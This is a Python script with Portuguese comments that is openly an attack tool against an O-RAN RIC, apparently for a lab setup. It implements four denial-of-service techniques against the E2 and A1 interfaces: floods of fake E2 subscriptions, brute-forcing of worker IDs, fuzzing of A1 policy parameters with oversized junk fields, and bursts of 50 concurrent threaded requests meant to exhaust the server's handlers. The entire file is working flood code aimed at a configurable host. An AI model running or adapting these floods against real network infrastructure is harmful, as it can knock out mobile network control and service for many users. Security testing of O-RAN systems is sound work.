"""
ataque_forca_bruta.py - Ataque de Força Bruta / Exaustão de Recursos para O-RAN
Alvo: Interface E2 (POST) e Interface A1 (PUT) do RIC

Técnicas:
    1. E2 Subscription Flood (xApp) - inunda RMR com subscrições E2 falsas
    2. Worker ID Brute Force (xApp) - exaustão de espaço de IDs de workers
    3. Policy Parameter Fuzzing (rApp) - milhões de combinações de políticas
    4. Concurrent Session Exhaustion (xApp+rApp) - esgota handlers concorrentes
"""

import threading
import urllib.request
import json
import time
import random
import sys
import string

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: FORCA BRUTA / EXAUSTAO - O-RAN")
print(f"  Alvo: {BASE_URL}")
print("  4 tecnicas de bruteforce e resource exhaustion")
print("=" * 60)

# ============================================================
# TECNICA 1: E2 SUBSCRIPTION FLOOD (xApp)
# ============================================================
def tecnica1_subscription_flood():
    """Inunda RMR com subscrições E2 falsas - impede subscrições legítimas"""
    while True:
        try:
            # Simula multiplas subscricoes E2 simultaneas
            for _ in range(20):
                e2_sub = {
                    "id": f"e2-sub-{random.randint(1, 99999)}",
                    "type": "E2_SUBSCRIPTION",
                    "action": "subscribe",
                    "event_trigger": f"cell_{random.randint(1, 100)}",
                    "action_type": random.choice(["report", "insert", "policy"]),
                    "xapp_id": f"malicious-xapp-{random.randint(1, 50)}",
                    "priority": random.randint(0, 255),
                    "sequence": random.randint(1, 1000000)
                }
                data = json.dumps(e2_sub).encode()
                req = urllib.request.Request(BASE_URL, data=data, method="POST")
                req.add_header('Content-Type', 'application/json')
                with urllib.request.urlopen(req, timeout=1): 
                    pass

                time.sleep(0.5) # Aproximadamente subscricoes/s
        except Exception as e:
            time.sleep(0.5)

# ============================================================
# TECNICA 2: WORKER ID BRUTE FORCE (xApp)
# ============================================================
def tecnica2_worker_id_bruteforce():
    """Exaure o espaco de IDs de workers - causa colisao e confusao"""
    time.sleep(3)
    worker_id = 0
    while True:
        try:
            for _ in range(50):
                worker_id = (worker_id + 1) % 100000
                worker = {
                    "id": f"bench-worker-{worker_id}",
                    "latency_ms": round(random.uniform(0, 100), 2),
                    "type": "benchmark",
                    "seq": worker_id
                }
                data = json.dumps(worker).encode()
                req = urllib.request.Request(BASE_URL, data=data, method="POST")
                req.add_header('Content-Type', 'application/json')
                with urllib.request.urlopen(req, timeout=1): 
                    pass

                time.sleep(0.3)
        except Exception as e:
            print(f"[BF-T2:WorkerID] Erro: {e}")
            time.sleep(0.5)

# ============================================================
# TECNICA 3: POLICY PARAMETER FUZZING (rApp)
# ============================================================
def tecnica3_policy_fuzzing():
    """Milhoes de combinacoes de parametros de politica A1"""
    time.sleep(6)
    scopes = [f"UE_GROUP_{i}" for i in range(1, 501)]
    reasons = [
        "ENERGY_SAVING", "LOAD_BALANCING", "QOS", "SPECTRUM",
        "INTERFERENCE", "EMERGENCY", "MAINTENANCE", "TEST",
        "OPTIMIZATION", "RECONFIG", "SCALE_UP", "SCALE_DOWN"
    ]

    while True:
        try:
            for _ in range(10):
                # Gera combinacoes pseudo-aleatorias de parametros
                policy = {
                    "type": "A1_POLICY",
                    "scope": random.choice(scopes),
                    "value": random.choice([True, False, 0, 1, "true", "false", "enable", "disable"]),
                    "reason": random.choice(reasons),
                    "priority": random.choice(["low", "medium", "high", "critical", "999"]),
                    "ttl": random.randint(-1, 99999),
                    "nonce": random.randint(0, 2**32 - 1),
                    "invalid_field": "x" * random.randint(1, 1000)  # Fuzzing de tamanho
                }
                data = json.dumps(policy).encode()
                req = urllib.request.Request(BASE_URL, data=data, method="PUT")
                req.add_header('Content-Type', 'application/json')
                with urllib.request.urlopen(req, timeout=1): 
                    pass

            time.sleep(0.2)
        except Exception as e:
            print(f"[BF-T3:Fuzzing] Erro: {e}")
            time.sleep(0.3)

# ============================================================
# TECNICA 4: CONCURRENT SESSION EXHAUSTION (xApp+rApp)
# ============================================================
def tecnica4_concurrent_exhaustion():
    """Esgota handlers concorrentes do servidor RIC"""
    time.sleep(9)

    def requisicao_rapida():
        try:
            payload = {
                "id": f"exhaust-{random.randint(1, 99999)}",
                "latency_ms": random.random() * 100,
                "type": "benchmark",
                "data": "x" * random.randint(10, 500)
            }
            data = json.dumps(payload).encode()
            req = urllib.request.Request(BASE_URL, data=data, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=0.5): 
                pass
        except:
            pass

    while True:
        try:
            threads = []
            for _ in range(50):  # 50 requisicoes simultaneas!
                t = threading.Thread(target=requisicao_rapida, daemon=True)
                t.start()
                threads.append(t)

            for t in threads:
                t.join(timeout=0.3)

            time.sleep(0.2)
        except Exception as e:
            print(f"[BF-T4:Exhaust] Erro: {e}")
            time.sleep(0.5)